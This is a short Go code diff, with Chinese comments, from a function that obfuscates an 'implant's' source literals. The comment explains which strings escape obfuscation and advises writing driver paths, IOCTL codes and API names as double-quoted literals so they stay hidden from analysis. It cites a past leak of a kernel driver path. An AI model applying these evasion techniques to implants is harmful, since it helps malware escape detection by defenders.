@@ -117,7 +117,12 @@ func obfuscateImplantSource(src []byte, xdBase byte) []byte {
 					lineStart = true
 				}
 			case c == '`':
-				// 反引号原始字符串（struct tag / 原始字面量）：原样复制到下一个反引号
+				// 反引号原始字符串：**原样保留，不参与混淆**。原因有二：
+				//   1) struct tag（`json:"name"` 这类）必须保持原样，改了 encoding/json 就废了；
+				//   2) 原始字符串常含多行脚本/正则，转义后极易出错。
+				// 因此规则是：**敏感字面量（设备路径、驱动名、IOCTL、API 名等）一律写成
+				// 双引号字面量**，才会被本函数改写为 xd("...")；写反引号等于明文留在
+				// 二进制里（v1.3.3 之前内置驱动的 `\\.\kgameprotect` 就是这么漏出去的）。
 				j := i + 1
 				for j < len(src) && src[j] != '`' {
 					j++
